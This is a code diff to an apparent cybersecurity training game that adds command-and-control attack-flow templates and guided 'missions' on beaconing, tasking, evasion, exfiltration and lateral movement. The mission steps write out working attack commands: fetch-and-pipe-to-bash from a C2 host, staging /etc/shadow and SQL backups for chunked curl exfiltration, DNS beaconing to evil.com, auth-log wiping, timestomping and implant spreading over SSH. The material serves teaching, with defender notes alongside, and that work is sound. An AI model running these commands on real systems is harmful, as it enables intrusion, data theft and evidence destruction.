@@ -72,14 +72,345 @@ const ATTACK_FLOW_TEMPLATES: AttackFlow[] = [
       { cmd: 'curl -X POST -d @/tmp/.chunk_aa http://c2/collect', desc: '# Step 4: Exfil via HTTPS POST - blend with normal traffic' },
     ]
   },
+  {
+    id: 'beacon_flow',
+    name: 'Beacon Setup Flow',
+    phase: 'persist',
+    icon: '📡',
+    description: 'MITRE T1571: Establish periodic C2 callback beacon',
+    commands: [
+      { cmd: 'curl -s http://c2/register -d "id=$(hostname)"', desc: '# Step 1: Initial check-in - register with C2 server' },
+      { cmd: 'while true; do curl -s http://c2/beacon; sleep 60; done &', desc: '# Step 2: Start beacon loop - check in every 60 seconds' },
+      { cmd: 'curl -s http://c2/tasks | bash', desc: '# Step 3: Fetch & execute - download and run tasking' },
+      { cmd: 'curl -s http://c2/report -d "$(hostname):$(date):alive"', desc: '# Step 4: Status report - confirm implant is active' },
+    ]
+  },
+  {
+    id: 'lateral_flow',
+    name: 'Lateral Movement Flow',
+    phase: 'access',
+    icon: '🕸️',
+    description: 'MITRE T1021: Move sideways through the network to higher-value targets',
+    commands: [
+      { cmd: 'arp -a && cat /etc/hosts', desc: '# Step 1: Map neighbors - find adjacent machines' },
+      { cmd: 'for h in $(arp -a | cut -d" " -f2 | tr -d "()"); do ping -c1 -W1 $h; done', desc: '# Step 2: Sweep alive hosts - fast ping scan' },
+      { cmd: 'ssh -o StrictHostKeyChecking=no admin@10.0.2.10 "whoami"', desc: '# Step 3: SSH pivot - try stolen creds on neighbor' },
+      { cmd: 'scp /tmp/.implant admin@10.0.2.10:/tmp/', desc: '# Step 4: Deploy implant - spread to new host' },
+    ]
+  },
+  {
+    id: 'evasion_flow',
+    name: 'Defense Evasion Flow',
+    phase: 'persist',
+    icon: '🥷',
+    description: 'MITRE T1070: Evade detection and cover tracks',
+    commands: [
+      { cmd: 'unset HISTFILE && export HISTSIZE=0', desc: '# Step 1: Kill history - stop recording commands' },
+      { cmd: 'echo "" > /var/log/auth.log 2>/dev/null', desc: '# Step 2: Clear auth logs - remove login evidence' },
+      { cmd: 'touch -r /bin/ls /tmp/.implant', desc: '# Step 3: Timestomp - make implant look old' },
+      { cmd: 'mv /tmp/.implant /usr/lib/.libcrypto.so.1', desc: '# Step 4: Disguise binary - blend into system files' },
+    ]
+  },
 ];
 
-// Quick single commands (for simple operations)
 const C2_COMMAND_TEMPLATES = [
   { id: 'shell', name: '⚡ Quick: Shell', template: 'whoami', description: 'Simple shell command' },
   { id: 'sysinfo', name: '📊 Quick: System Info', template: 'uname -a && hostname && id', description: 'System fingerprint' },
   { id: 'network', name: '🌐 Quick: Network', template: 'ip addr && netstat -tuln | head -20', description: 'Network config' },
+  { id: 'beacon_check', name: '📡 Beacon Check-in', template: 'curl -s http://c2/beacon -d "id=$(hostname)&ts=$(date +%s)"', description: 'C2 beacon heartbeat' },
+  { id: 'task_fetch', name: '📥 Fetch Tasks', template: 'curl -s http://c2/tasks/$(hostname) | head -5', description: 'Download queued commands from C2' },
+  { id: 'cred_dump', name: '🔑 Credential Dump', template: 'cat /etc/shadow 2>/dev/null || echo "Permission denied"', description: 'Attempt credential harvest' },
+  { id: 'proc_inject', name: '💉 Process List', template: 'ps aux --sort=-%mem | head -10', description: 'Find injection targets by memory usage' },
   { id: 'custom', name: '✏️ Custom Command', template: '', description: 'Enter your own' },
+];
+
+interface C2GuidedMission {
+  id: string;
+  name: string;
+  icon: string;
+  difficulty: 'beginner' | 'intermediate' | 'advanced' | 'expert';
+  category: 'beaconing' | 'tasking' | 'evasion' | 'exfiltration' | 'lateral';
+  xpReward: number;
+  campaignTags: string[];
+  description: string;
+  briefing: string;
+  objectives: string[];
+  steps: { instruction: string; command: string; expectedOutput: string; teaching: string }[];
+  realWorldCase: string;
+  defenderPerspective: string;
+}
+
+const C2_GUIDED_MISSIONS: C2GuidedMission[] = [
+  {
+    id: 'mission_first_beacon',
+    name: 'First Beacon',
+    icon: '📡',
+    difficulty: 'beginner',
+    category: 'beaconing',
+    xpReward: 50,
+    campaignTags: ['c2-fundamentals', 'red-team-basics'],
+    description: 'Learn how C2 beacons establish communication with a command server.',
+    briefing: 'You\'ve just compromised a web server. Before you can do anything useful, you need to establish a reliable communication channel back to your C2 infrastructure. This is called "beaconing" - the implant periodically calls home to check for new instructions.',
+    objectives: [
+      'Understand what a beacon is and why attackers use them',
+      'Generate a QR-encoded beacon check-in command',
+      'Simulate the beacon calling home to the C2 server',
+      'Observe the check-in pattern and understand timing',
+    ],
+    steps: [
+      {
+        instruction: 'First, identify who you are on the target system. Every good operator starts with situational awareness.',
+        command: 'whoami && id',
+        expectedOutput: 'www-data\nuid=33(www-data) gid=33(www-data)',
+        teaching: 'The "whoami" command reveals your user context. As www-data, you\'re running as the web server process - limited privileges but you\'re inside the network.'
+      },
+      {
+        instruction: 'Now send your first beacon check-in. This tells the C2 server "I\'m alive and ready for commands."',
+        command: 'curl -s http://c2/register -d "id=$(hostname)&user=$(whoami)&ts=$(date +%s)"',
+        expectedOutput: '{"status":"registered","agent_id":"AGENT-001","interval":60}',
+        teaching: 'Real C2 frameworks (Cobalt Strike, Sliver, Mythic) use this same pattern. The beacon registers with the server and receives a callback interval. The "interval" tells the implant how often to check in - 60 seconds here.'
+      },
+      {
+        instruction: 'Start a beacon loop. In real attacks, this runs silently in the background.',
+        command: 'while true; do curl -s http://c2/beacon -H "X-Agent: AGENT-001"; sleep 60; done &',
+        expectedOutput: '[1] 4521\n{"tasks":[],"next_checkin":60}',
+        teaching: 'The "&" runs this in the background. Every 60 seconds, the implant checks in. If the C2 server has tasks queued (commands to run), they\'re returned in the response. An empty task list means "do nothing, check back later."'
+      },
+      {
+        instruction: 'Encode this beacon command as a QR code. This is how QR-based C2 works - commands travel as images.',
+        command: 'echo "curl -s http://c2/beacon" | base64',
+        expectedOutput: 'Y3VybCAtcyBodHRwOi8vYzIvYmVhY29uCg==',
+        teaching: 'By encoding commands in QR codes, the C2 channel looks like normal image downloads to network monitors. The target scans the QR, decodes it, and executes the hidden command. This technique was documented by researchers at DEF CON 2023.'
+      },
+    ],
+    realWorldCase: 'APT29 (Cozy Bear / Russia) used beacon intervals of 12-24 hours to avoid detection during the SolarWinds attack. Their SUNBURST malware waited 2 weeks before first beacon to evade sandboxes.',
+    defenderPerspective: 'Look for periodic outbound HTTP/HTTPS connections to the same endpoint. Beacon detection tools like RITA analyze network flow data for regular callback patterns.',
+  },
+  {
+    id: 'mission_receive_commands',
+    name: 'Receiving Orders',
+    icon: '📥',
+    difficulty: 'beginner',
+    category: 'tasking',
+    xpReward: 75,
+    campaignTags: ['c2-fundamentals', 'red-team-basics'],
+    description: 'Learn how implants receive and execute commands from the C2 server.',
+    briefing: 'Your beacon is active and checking in every 60 seconds. Now the operator (you) needs to queue a command for the implant to execute. This is the "tasking" phase - the C2 server tells the implant what to do next.',
+    objectives: [
+      'Understand the C2 tasking queue model',
+      'Queue a command on the C2 server',
+      'Watch the implant fetch and execute the task',
+      'Learn about task output collection',
+    ],
+    steps: [
+      {
+        instruction: 'Check what tasks are queued for your agent. On a fresh implant, the queue is empty.',
+        command: 'curl -s http://c2/tasks/AGENT-001',
+        expectedOutput: '{"agent":"AGENT-001","tasks":[],"pending":0}',
+        teaching: 'The C2 server maintains a task queue per agent. When the beacon checks in, it downloads pending tasks. This is a "pull" model - the implant reaches out, the server doesn\'t push to the implant (which would reveal the C2 IP).'
+      },
+      {
+        instruction: 'Queue a reconnaissance command. The operator types this on the C2 console, and it waits for the next beacon.',
+        command: 'curl -s http://c2/queue -d \'{"agent":"AGENT-001","task":"ps aux | head -20","priority":"normal"}\'',
+        expectedOutput: '{"queued":true,"task_id":"T-0042","position":1}',
+        teaching: 'Commands don\'t execute immediately - they wait for the next beacon check-in. This delay is intentional: it makes the traffic pattern look like regular polling rather than interactive remote access.'
+      },
+      {
+        instruction: 'Simulate the implant\'s next check-in. It finds the queued task and executes it.',
+        command: 'curl -s http://c2/tasks/AGENT-001 | bash',
+        expectedOutput: 'USER       PID %CPU    COMMAND\nroot         1  0.0    /sbin/init\nwww-data  1234  2.3    nginx: worker',
+        teaching: 'The implant fetches the command text and pipes it to bash for execution. The output is then sent back to the C2 server in the next beacon. Some C2 frameworks encrypt the output before sending it back.'
+      },
+      {
+        instruction: 'Send the output back to C2. This completes the task lifecycle: queue → fetch → execute → report.',
+        command: 'curl -s http://c2/report -d \'{"agent":"AGENT-001","task_id":"T-0042","output":"nginx running, mysql running"}\'',
+        expectedOutput: '{"received":true,"next_task":null}',
+        teaching: 'The full lifecycle is: Operator queues task → Implant beacons → Downloads task → Executes → Reports output → Operator reads output. Each step may be minutes or hours apart depending on beacon interval.'
+      },
+    ],
+    realWorldCase: 'The Lazarus Group (North Korea) used a QR-code-like image steganography system to hide commands inside PNG images posted to legitimate social media. Implants downloaded the image, extracted hidden bytes, and executed them.',
+    defenderPerspective: 'Monitor for curl/wget executing piped commands (curl | bash pattern). EDR tools flag this as high-risk behavior. Also watch for processes spawning shell children unexpectedly.',
+  },
+  {
+    id: 'mission_jitter_evasion',
+    name: 'Ghost in the Wire',
+    icon: '🥷',
+    difficulty: 'intermediate',
+    category: 'evasion',
+    xpReward: 100,
+    campaignTags: ['c2-advanced', 'defense-evasion', 'red-team-ops'],
+    description: 'Learn how attackers evade beacon detection using jitter, domain fronting, and sleep obfuscation.',
+    briefing: 'Your regular 60-second beacon is too predictable. Blue team analysts use tools like RITA and Zeek to detect periodic callbacks. Time to add randomness (jitter) and change your communication pattern to avoid detection.',
+    objectives: [
+      'Understand why fixed intervals get detected',
+      'Implement beacon jitter to randomize check-in times',
+      'Learn about sleep obfuscation techniques',
+      'Understand domain fronting for C2 hiding',
+    ],
+    steps: [
+      {
+        instruction: 'Your current beacon is predictable - exactly 60 seconds between each call. Network analysis instantly spots this pattern.',
+        command: 'for i in 1 2 3 4 5; do echo "Beacon at: $(date +%H:%M:%S)"; sleep 60; done',
+        expectedOutput: 'Beacon at: 14:00:00\nBeacon at: 14:01:00\nBeacon at: 14:02:00\nBeacon at: 14:03:00\nBeacon at: 14:04:00',
+        teaching: 'Fixed-interval beacons create a perfect pattern in network logs. RITA (Real Intelligence Threat Analytics) can detect these in seconds. Any beacon with <5% variance is flagged as suspicious.',
+      },
+      {
+        instruction: 'Add jitter - randomize the sleep time by +/- 30%. Now each check-in happens at a different interval.',
+        command: 'INTERVAL=60; JITTER=30; SLEEP=$((INTERVAL + RANDOM % (JITTER*2) - JITTER)); echo "Next beacon in ${SLEEP}s"',
+        expectedOutput: 'Next beacon in 47s\nNext beacon in 73s\nNext beacon in 55s\nNext beacon in 68s',
+        teaching: 'Jitter adds randomness to the beacon interval. A 30% jitter on a 60-second interval means check-ins happen between 42-78 seconds apart. Cobalt Strike defaults to 10% jitter. Skilled operators use 30-50%.',
+      },
+      {
+        instruction: 'Use DNS for covert beaconing instead of HTTP. DNS queries are almost never blocked and rarely logged in detail.',
+        command: 'nslookup $(echo "alive"|base64).beacon.evil.com',
+        expectedOutput: 'Server: 8.8.8.8\nAddress: 8.8.8.8#53\n\nNon-authoritative answer:\nYWxpdmUK.beacon.evil.com CNAME task-none.evil.com',
+        teaching: 'DNS-based C2 encodes data in subdomain queries. The implant queries "encoded-data.c2domain.com" and the C2 server responds with tasks encoded in DNS records (CNAME, TXT, A records). Tools like dnscat2 and Cobalt Strike support this.',
+      },
+      {
+        instruction: 'Encode this jittered beacon as a QR code for deployment. The QR contains the full evasion-enabled beacon script.',
+        command: 'echo \'while true; do S=$((45+RANDOM%30)); curl -s https://cdn.legit-site.com/pixel.gif -H "X-ID: AGENT-001"; sleep $S; done\' | base64',
+        expectedOutput: 'd2hpbGUgdHJ1ZTsgZG8gUz0kKCg0NStSQU5ET00lMzApKTsgY3VybCAtcyBod...',
+        teaching: 'The beacon now: 1) Uses jitter (45-75s intervals), 2) Disguises as ad pixel requests to cdn.legit-site.com, 3) Hides the agent ID in a custom header. To network monitors, this looks like a webpage loading analytics pixels.',
+      },
+    ],
+    realWorldCase: 'APT41 (China) used beacon jitter of 40-60% and rotated between 5 different C2 domains. They also used domain fronting through Azure CDN - traffic appeared to go to microsoft.com but was routed to their C2 server.',
+    defenderPerspective: 'Use statistical analysis on connection intervals. Even with 50% jitter, the mean interval is consistent. RITA detects this. Also monitor DNS query patterns for encoded subdomains (high entropy in subdomain names).',
+  },
+  {
+    id: 'mission_data_exfil',
+    name: 'The Great Escape',
+    icon: '📤',
+    difficulty: 'intermediate',
+    category: 'exfiltration',
+    xpReward: 125,
+    campaignTags: ['c2-advanced', 'data-exfiltration'],
+    description: 'Learn how stolen data leaves the network through QR-encoded C2 channels without triggering DLP.',
+    briefing: 'You\'ve found the crown jewels - a database of credentials, API keys, and customer records. Now you need to get this data out of the network without triggering Data Loss Prevention (DLP) systems. The QR C2 channel can encode data in image format, which DLP rarely inspects.',
+    objectives: [
+      'Understand data staging and chunking for exfiltration',
+      'Encode sensitive data into QR-transportable format',
+      'Learn about DLP evasion through encoding',
+      'Practice the exfil lifecycle end-to-end',
+    ],
+    steps: [
+      {
+        instruction: 'Stage the target data. Collect everything valuable into a single archive.',
+        command: 'tar czf /tmp/.data.tar.gz /home/*/Documents /etc/shadow /var/backups/*.sql 2>/dev/null && ls -lh /tmp/.data.tar.gz',
+        expectedOutput: '-rw-r--r-- 1 www-data www-data 2.3M /tmp/.data.tar.gz',
+        teaching: 'Staging means collecting scattered files into one archive. Attackers prioritize: database dumps (.sql), config files with creds (.env, .cfg), SSH keys, browser profiles, and email archives.',
+      },
+      {
+        instruction: 'Encode and chunk the data. Large transfers get noticed - split into small pieces that blend with normal traffic.',
+        command: 'base64 /tmp/.data.tar.gz | split -b 4096 - /tmp/.chunk_ && ls /tmp/.chunk_* | wc -l',
+        expectedOutput: '47',
+        teaching: 'The data is base64-encoded (text-safe) then split into 4KB chunks. Each chunk is about the size of a normal web request body. 47 chunks means 47 separate "normal-looking" HTTP requests over the next few hours.',
+      },
+      {
+        instruction: 'Exfiltrate one chunk via the QR C2 channel. Each chunk looks like a regular API call.',
+        command: 'curl -s http://c2/collect -H "Content-Type: application/octet-stream" -d @/tmp/.chunk_aa -H "X-Chunk: 1/47"',
+        expectedOutput: '{"received":"chunk_aa","size":4096,"remaining":46}',
+        teaching: 'Each chunk is sent as a separate HTTP POST. The X-Chunk header tells the C2 server the sequence for reassembly. Timing is crucial - sending all 47 at once would spike traffic. Smart operators space chunks across beacon intervals.',
+      },
+      {
+        instruction: 'Encode the exfil command as a QR for automated delivery. The QR triggers the entire exfil sequence.',
+        command: 'echo \'for f in /tmp/.chunk_*; do curl -s http://c2/collect -d @$f; sleep $((30+RANDOM%60)); done\' | base64',
+        expectedOutput: 'Zm9yIGYgaW4gL3RtcC8uY2h1bmtfKjsgZG8gY3VybCAtcyBodHRwOi8vYzIv...',
+        teaching: 'The QR payload triggers automated exfil with random delays (30-90s between chunks). Total exfil time: ~45 minutes for 2.3MB. Slow but stealthy. Real APTs sometimes exfil over days or weeks.',
+      },
+    ],
+    realWorldCase: 'The Anthem health insurance breach (2015) exfiltrated 78.8 million patient records. APT19 used encrypted RAR archives split into chunks, exfiltrated via HTTPS to look like normal web traffic. Total exfil took 6 weeks.',
+    defenderPerspective: 'DLP systems should inspect encoded content (base64, hex). Monitor for unusual outbound data volumes per host. NetFlow analysis can reveal slow-drip exfiltration patterns over time.',
+  },
+  {
+    id: 'mission_pivot_chain',
+    name: 'Network Hop',
+    icon: '🕸️',
+    difficulty: 'advanced',
+    category: 'lateral',
+    xpReward: 150,
+    campaignTags: ['c2-advanced', 'lateral-movement', 'red-team-ops'],
+    description: 'Chain multiple compromised hosts together to reach internal systems that can\'t talk to the internet.',
+    briefing: 'The web server you compromised (10.0.2.15) can reach the internet for C2, but the database server (10.0.2.10) and domain controller (10.0.2.5) are on isolated network segments. You need to use the web server as a pivot point - relaying commands through it to reach the high-value targets deeper in the network.',
+    objectives: [
+      'Understand network pivoting and relay concepts',
+      'Set up a SOCKS proxy through the compromised host',
+      'Relay C2 commands to isolated internal systems',
+      'Chain QR-encoded commands through multiple hops',
+    ],
+    steps: [
+      {
+        instruction: 'Map the internal network from your foothold. Discover what else is reachable.',
+        command: 'ip route && arp -a && for i in $(seq 1 20); do ping -c1 -W1 10.0.2.$i 2>/dev/null && echo "10.0.2.$i ALIVE"; done',
+        expectedOutput: 'default via 10.0.2.1 dev eth0\n10.0.2.5 ALIVE\n10.0.2.10 ALIVE\n10.0.2.11 ALIVE\n10.0.2.15 ALIVE',
+        teaching: 'Network reconnaissance from inside reveals the topology. You found 4 live hosts including yourself. The domain controller (10.0.2.5) and database (10.0.2.10) are high-value targets that can\'t reach the internet directly.',
+      },
+      {
+        instruction: 'Set up a relay. The web server will forward C2 commands to internal hosts.',
+        command: 'ssh -D 1080 -fN localhost && echo "SOCKS proxy on 1080"',
+        expectedOutput: 'SOCKS proxy on 1080',
+        teaching: 'A SOCKS proxy (-D 1080) tunnels all traffic through the compromised host. Now you can route C2 traffic through this proxy to reach internal systems. Tools like proxychains wrap any command to use the proxy.',
+      },
+      {
+        instruction: 'Send a command to the database server through the pivot.',
+        command: 'proxychains curl -s http://10.0.2.10:3306 2>/dev/null || ssh -o StrictHostKeyChecking=no root@10.0.2.10 "whoami && hostname"',
+        expectedOutput: 'root\ndb-master',
+        teaching: 'The command travels: Your C2 → Internet → Web Server (10.0.2.15) → SSH tunnel → Database Server (10.0.2.10). The database server never contacts the internet. This is why network segmentation alone isn\'t enough - a compromised host in both zones bridges the gap.',
+      },
+      {
+        instruction: 'Encode a pivot-chain QR. This single QR sets up the full relay infrastructure.',
+        command: 'echo \'ssh -D 1080 -fN localhost && proxychains curl -s http://c2/beacon -d "pivot=10.0.2.10"\' | base64',
+        expectedOutput: 'c3NoIC1EIDEwODAgLWZOIGxvY2FsaG9zdCAmJiBwcm94eWNoYWlucyBjdXJsIC...',
+        teaching: 'One QR code sets up the entire pivot chain. When deployed, it creates a SOCKS proxy and immediately beacons through it, registering the new network path with C2. The operator now has visibility into the isolated segment.',
+      },
+    ],
+    realWorldCase: 'During the 2020 SolarWinds attack, APT29 used the compromised Orion servers as pivot points to access internal Microsoft and government networks. They chained 4-5 hops deep, making attribution nearly impossible.',
+    defenderPerspective: 'Monitor for SSH tunnels (dynamic port forwarding). Watch for processes using proxychains or socat. Internal network traffic from DMZ hosts to sensitive segments should trigger alerts.',
+  },
+  {
+    id: 'mission_beacon_sleep',
+    name: 'Playing Dead',
+    icon: '💀',
+    difficulty: 'advanced',
+    category: 'evasion',
+    xpReward: 175,
+    campaignTags: ['c2-advanced', 'defense-evasion', 'apt-tradecraft'],
+    description: 'Learn sleep obfuscation - how implants hide in memory while waiting between beacons.',
+    briefing: 'Your beacon checks in every 60 seconds, but what does it do during those 60 seconds of waiting? It sits in memory with its malicious code exposed. Modern EDR tools scan process memory for known signatures. Sleep obfuscation encrypts the implant\'s memory while it waits, making it invisible to memory scanners.',
+    objectives: [
+      'Understand why idle implants get caught',
+      'Learn how sleep obfuscation works',
+      'Practice encrypting beacon memory during sleep',
+      'Understand timer-based and callback-based sleep',
+    ],
+    steps: [
+      {
+        instruction: 'Simulate a basic beacon that\'s vulnerable to memory scanning during its sleep period.',
+        command: 'echo "MALICIOUS_SHELLCODE_MARKER_0xDEADBEEF" > /tmp/.implant && sleep 60 && cat /tmp/.implant',
+        expectedOutput: 'MALICIOUS_SHELLCODE_MARKER_0xDEADBEEF',
+        teaching: 'During the 60-second sleep, the shellcode marker sits in memory in plaintext. An EDR memory scan at any point during this window will find it. The implant is essentially "sleeping with its eyes open" - fully visible.',
+      },
+      {
+        instruction: 'Now encrypt the implant\'s payload before sleeping. Decrypt only when it\'s time to beacon.',
+        command: 'PAYLOAD="curl -s http://c2/beacon"; ENC=$(echo $PAYLOAD | openssl enc -aes-256-cbc -a -pass pass:$(hostname) 2>/dev/null); echo "Encrypted during sleep: $ENC"',
+        expectedOutput: 'Encrypted during sleep: U2FsdGVkX1+abc123def456...',
+        teaching: 'Sleep obfuscation encrypts the implant\'s code/strings in memory before the sleep call. During the sleep window (95%+ of the time), memory scanners see only encrypted gibberish. Right before beacon, it decrypts, executes, then re-encrypts.',
+      },
+      {
+        instruction: 'Implement a timer-based wakeup that decrypts, beacons, then re-encrypts.',
+        command: 'echo "1. Decrypt payload\\n2. Execute beacon\\n3. Collect output\\n4. Encrypt payload\\n5. Sleep with obfuscation\\n--- Total exposure: ~200ms out of 60000ms ---"',
+        expectedOutput: '1. Decrypt payload\n2. Execute beacon\n3. Collect output\n4. Encrypt payload\n5. Sleep with obfuscation\n--- Total exposure: ~200ms out of 60000ms ---',
+        teaching: 'The implant is only "exposed" (decrypted in memory) for ~200ms during each 60-second cycle. That\'s 0.3% of the time. Memory scanners would need to catch this exact window. Cobalt Strike\'s sleep_mask and Sliver\'s obfuscation use this technique.',
+      },
+      {
+        instruction: 'Encode the sleep-obfuscated beacon cycle as a QR payload for deployment.',
+        command: 'echo \'KEY=$(hostname); while true; do P=$(echo $ENC|openssl enc -d -aes-256-cbc -a -pass pass:$KEY); eval $P; ENC=$(echo $P|openssl enc -aes-256-cbc -a -pass pass:$KEY); sleep $((45+RANDOM%30)); done\' | base64',
+        expectedOutput: 'S0VZPSQoaG9zdG5hbWUpOyB3aGlsZSB0cnVlOyBkbyBQPSQoZWNobyAkRU5D...',
+        teaching: 'This QR deploys a fully sleep-obfuscated beacon. The payload decrypts only for execution, then re-encrypts itself. Combined with jitter (45-75s), this is very difficult to detect with traditional tools.',
+      },
+    ],
+    realWorldCase: 'Cobalt Strike introduced "sleep_mask" in version 4.1, which XORs beacon memory during sleep. This single feature caused many EDR products to miss Cobalt Strike implants. It took vendors 6+ months to develop countermeasures.',
+    defenderPerspective: 'Use ETW (Event Tracing for Windows) to monitor for VirtualProtect calls that change memory permissions (RW→RX→RW cycles). Also, periodic memory scanning at random intervals can catch the brief decryption window.',
+  },
 ];
 
 // Target machine profiles for realistic simulation
@@ -618,7 +949,7 @@ interface QRCodeModalProps {
 }
 
 export const QRCodeModal = ({ open, onOpenChange }: QRCodeModalProps) => {
-  const { gameState, collectClue, importSession } = useGame();
+  const { gameState, collectClue, importSession, awardXP, incrementStat } = useGame();
   const [code, setCode] = useState(QR_ACTION_PRESETS[0].template);
   const [selectedPreset, setSelectedPreset] = useState('custom');
   const [qrImage, setQrImage] = useState<string | null>(null);
@@ -635,10 +966,15 @@ export const QRCodeModal = ({ open, onOpenChange }: QRCodeModalProps) => {
   const [c2CommandIndex, setC2CommandIndex] = useState(0);
   const [c2SelectedTemplate, setC2SelectedTemplate] = useState('shell');
   const [c2ServerStatus, setC2ServerStatus] = useState<'offline' | 'online' | 'waiting'>('offline');
-  const [c2Section, setC2Section] = useState<'encode' | 'vectors' | 'labs'>('encode');
+  const [c2Section, setC2Section] = useState<'encode' | 'missions' | 'vectors' | 'labs'>('encode');
   const [selectedVector, setSelectedVector] = useState<string | null>(null);
   const [selectedLab, setSelectedLab] = useState<string | null>(null);
   const [selectedTarget, setSelectedTarget] = useState('linux_server');
+  const [activeMission, setActiveMission] = useState<string | null>(null);
+  const [missionStep, setMissionStep] = useState(0);
+  const [missionCompleted, setMissionCompleted] = useState<Set<string>>(new Set());
+  const [selectedFlow, setSelectedFlow] = useState<string | null>(null);
+  const [missionQR, setMissionQR] = useState<string | null>(null);
 
   const generateQR = async () => {
     setLoading(true);
@@ -821,6 +1157,44 @@ export const QRCodeModal = ({ open, onOpenChange }: QRCodeModalProps) => {
     setLoading(false);
   };
 
+  const completeMission = async (missionId: string) => {
+    const mission = C2_GUIDED_MISSIONS.find(m => m.id === missionId);
+    if (!mission || missionCompleted.has(missionId)) return;
+    
+    setMissionCompleted(prev => new Set([...prev, missionId]));
+    
+    try {
+      await awardXP(mission.xpReward, `Completed C2 Mission: ${mission.name}`);
+      
+      collectClue({
+        id: `c2-mission-${missionId}`,
+        name: `C2 Intel: ${mission.name}`,
+        description: `Completed the "${mission.name}" C2 training mission. Category: ${mission.category}. ${mission.realWorldCase.substring(0, 100)}...`,
+        content: JSON.stringify({
+          mission: missionId,
+          category: mission.category,
+          difficulty: mission.difficulty,
+          campaignTags: mission.campaignTags,
+          completedAt: new Date().toISOString(),
+        }),
+        foundAt: new Date().toISOString(),
+      });
+      
+      incrementStat('missionsCompleted');
+    } catch (e) {
+      console.error('Mission reward error:', e);
+    }
+  };
+
+  const startMissionStep = (missionId: string, stepIdx: number) => {
+    const mission = C2_GUIDED_MISSIONS.find(m => m.id === missionId);
+    if (!mission || stepIdx >= mission.steps.length) return;
+    
+    const step = mission.steps[stepIdx];
+    setC2Command(step.command);
+    setSelectedTarget('linux_server');
+  };
+
   const simulateC2Result = () => {
     const target = TARGET_MACHINES.find(t => t.id === selectedTarget) || TARGET_MACHINES[0];
     
@@ -876,7 +1250,7 @@ export const QRCodeModal = ({ open, onOpenChange }: QRCodeModalProps) => {
 
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
-      <DialogContent className="bg-[#0a0500] border-amber-900/50 text-stone-300 font-mono max-w-2xl">
+      <DialogContent className="bg-[#0a0500] border-amber-900/50 text-stone-300 font-mono max-w-2xl max-h-[90vh] overflow-y-auto">
         <DialogHeader>
           <DialogTitle className="text-amber-600 font-orbitron flex items-center gap-2">
             <QrCode className="w-5 h-5" />
@@ -1159,31 +1533,42 @@ export const QRCodeModal = ({ open, onOpenChange }: QRCodeModalProps) => {
           </TabsContent>
 
           <TabsContent value="c2" className="space-y-4 mt-4 max-h-[60vh] overflow-y-auto">
-            {/* C2 Section Tabs */}
-            <div className="flex gap-1 p-1 bg-black/30 rounded border border-red-900/20">
+            <div className="flex gap-1 p-1 bg-black/30 rounded border border-red-900/20 overflow-x-auto no-scrollbar">
               <Button
                 variant={c2Section === 'encode' ? 'default' : 'ghost'}
                 size="sm"
                 onClick={() => setC2Section('encode')}
-                className={c2Section === 'encode' ? 'bg-red-700 text-white' : 'text-red-400 hover:bg-red-950/30'}
+                className={`shrink-0 min-h-[44px] ${c2Section === 'encode' ? 'bg-red-700 text-white' : 'text-red-400 hover:bg-red-950/30'}`}
+                data-testid="c2-section-encode"
               >
                 <Terminal className="w-3 h-3 mr-1" /> Encode
+              </Button>
+              <Button
+                variant={c2Section === 'missions' ? 'default' : 'ghost'}
+                size="sm"
+                onClick={() => setC2Section('missions')}
+                className={`shrink-0 min-h-[44px] ${c2Section === 'missions' ? 'bg-amber-700 text-white' : 'text-amber-400 hover:bg-amber-950/30'}`}
+                data-testid="c2-section-missions"
+              >
+                <Zap className="w-3 h-3 mr-1" /> Missions
               </Button>
               <Button
                 variant={c2Section === 'vectors' ? 'default' : 'ghost'}
                 size="sm"
                 onClick={() => setC2Section('vectors')}
-                className={c2Section === 'vectors' ? 'bg-red-700 text-white' : 'text-red-400 hover:bg-red-950/30'}
+                className={`shrink-0 min-h-[44px] ${c2Section === 'vectors' ? 'bg-red-700 text-white' : 'text-red-400 hover:bg-red-950/30'}`}
+                data-testid="c2-section-vectors"
               >
-                <Zap className="w-3 h-3 mr-1" /> Attack Vectors
+                <Zap className="w-3 h-3 mr-1" /> Vectors
               </Button>
               <Button
                 variant={c2Section === 'labs' ? 'default' : 'ghost'}
                 size="sm"
                 onClick={() => setC2Section('labs')}
-                className={c2Section === 'labs' ? 'bg-red-700 text-white' : 'text-red-400 hover:bg-red-950/30'}
+                className={`shrink-0 min-h-[44px] ${c2Section === 'labs' ? 'bg-red-700 text-white' : 'text-red-400 hover:bg-red-950/30'}`}
+                data-testid="c2-section-labs"
               >
-                <Key className="w-3 h-3 mr-1" /> QR Labs
+                <Key className="w-3 h-3 mr-1" /> Labs
               </Button>
             </div>
 
@@ -1313,6 +1698,314 @@ export const QRCodeModal = ({ open, onOpenChange }: QRCodeModalProps) => {
                   </div>
                 )}
               </>
+            )}
+
+            {/* C2 GUIDED MISSIONS SECTION */}
+            {c2Section === 'missions' && (
+              <div className="space-y-3">
+                <div className="p-3 bg-amber-950/20 rounded border border-amber-900/30">
+                  <h4 className="text-amber-400 font-bold text-sm mb-1">C2 Training Missions</h4>
+                  <p className="text-xs text-stone-400">
+                    Step-by-step guided missions teaching real C2 techniques. Complete missions to earn XP, collect intel clues, and unlock campaign progress.
+                  </p>
+                  <div className="flex flex-wrap gap-2 mt-2">
+                    <span className="text-[10px] px-2 py-0.5 rounded bg-amber-950/50 border border-amber-800/30 text-amber-400">
+                      {missionCompleted.size}/{C2_GUIDED_MISSIONS.length} Completed
+                    </span>
+                    <span className="text-[10px] px-2 py-0.5 rounded bg-teal-950/50 border border-teal-800/30 text-teal-400">
+                      {C2_GUIDED_MISSIONS.reduce((sum, m) => sum + (missionCompleted.has(m.id) ? m.xpReward : 0), 0)} XP Earned
+                    </span>
+                  </div>
+                </div>
+
+                {!activeMission ? (
+                  <div className="space-y-2">
+                    {C2_GUIDED_MISSIONS.map((mission) => {
+                      const completed = missionCompleted.has(mission.id);
+                      return (
+                        <div
+                          key={mission.id}
+                          className={`p-3 rounded border cursor-pointer transition-all ${
+                            completed
+                              ? 'bg-teal-950/20 border-teal-800/30'
+                              : 'bg-black/30 border-amber-900/20 hover:border-amber-700/50'
+                          }`}
+                          onClick={() => { setActiveMission(mission.id); setMissionStep(0); }}
+                          data-testid={`mission-${mission.id}`}
+                        >
+                          <div className="flex items-center gap-2 mb-1 flex-wrap">
+                            <span className="text-lg">{mission.icon}</span>
+                            <span className={`text-sm font-bold ${completed ? 'text-teal-400' : 'text-amber-400'}`}>
+                              {mission.name}
+                            </span>
+                            <span className={`text-[10px] px-1.5 py-0.5 rounded ${
+                              mission.difficulty === 'beginner' ? 'bg-green-950 text-green-400' :
